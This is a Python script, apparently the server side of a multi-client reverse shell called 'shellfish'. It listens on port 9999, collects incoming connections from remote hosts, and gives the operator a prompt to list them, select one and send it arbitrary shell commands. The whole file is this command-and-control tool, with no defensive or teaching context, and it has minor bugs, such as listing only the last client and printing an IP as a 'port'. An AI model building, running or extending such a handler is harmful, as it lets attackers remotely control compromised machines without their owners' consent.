# blocked:)

import socket
import sys
import threading
from queue import Queue

NUMBER_OF_THREADS = 2
JOB_NUMBER = [1, 2]
queue = Queue()
all_connections = []
all_addresses = []


# creating a socket
def create_socket():
    try:
        global host
        global port
        global s  # socket connection
        host = ""
        port = 9999
        s = socket.socket()
        print("creating socket....")
    except socket.error as e:
        print(f"SOCKET CREATION ERROR: {str(e)}")


# binding and listening for connections
def bind_socket():
    try:
        global host
        global port
        global s  # socket connection
        print(f"Binding the port: {str(port)}")
        s.bind((host, port))
        s.listen(5)
    except socket.error as e:
        print(f"SOCKET BINDING ERROR: {str(e)} \n Retrying....")
        bind_socket()  # recursion for binding the connection


def accepting_connection():
    # closing the previous connections
    for connection in all_connections:
        connection.close()

    del all_connections[:]
    del all_addresses[:]

    while True:
        try:
            connection, address = s.accept()
            s.setblocking(True)  # preventing timeout from client side
            all_connections.append(connection)
            all_addresses.append(address)
            print(f"Connection has been setup successfully at | port {address[0]}")
        except:
            print("Error in accepting connection")


# custom shell for server side

def start_shellfish():
    while True:
        cmd = input("shellfish::> ")
        if cmd == 'list-conn':
            list_connections()
        elif 'select' in cmd:
            connection, target_id = select_client(cmd)
            if connection is not None:
                send_client_commands(connection, target_id)
        else:
            print("command is not recognized by the shellfish :(\n")


# display all active connections and their id's
def list_connections():
    results = ""
    for select_id, connection in enumerate(all_connections):
        try:
            connection.send(str.encode(" "))
            connection.recv(32768)
        except:
            del all_connections[select_id]
            del all_addresses[select_id]
            continue

        results = str(select_id) + " | ip: " + str(all_addresses[select_id][0]) + " | port: " + str(
            all_addresses[select_id][1]) + "\n"
    print("========= All active clients =========" + "\n" + results)


def select_client(cmd):
    try:
        target_id = int(cmd.replace("select ", ""))
        connection = all_connections[target_id]
        print(f"Now connected to | port: {all_addresses[target_id][0]}")
        # print(f"shellfish ({all_addresses[target_id][0]})::> ", end="")
        return connection, target_id
    except:
        print("Selection not valid")
        return None


def send_client_commands(connection, target_id):
    while True:
        try:
            cmd = input(f"shellfish ({all_addresses[target_id][0]})::> ")
            if cmd == 'quit':
                break
            if len(str.encode(cmd)) > 0:
                connection.send(str.encode(cmd))
                client_response = str(connection.recv(32768), "utf-8")
                print(client_response, end="")
        except:
            print("Error in sending commands")
            break


def create_threads():
    for _ in range(NUMBER_OF_THREADS):
        t = threading.Thread(target=job)
        t.daemon = True
        t.start()


def job():
    while True:
        x = queue.get()
        if x == 1:
            create_socket()
            bind_socket()
            accepting_connection()
        if x == 2:
            start_shellfish()

        queue.task_done()


def create_jobs():
    for x in JOB_NUMBER:
        queue.put(x)

    queue.join()


def main():
    create_threads()
    create_jobs()


main()
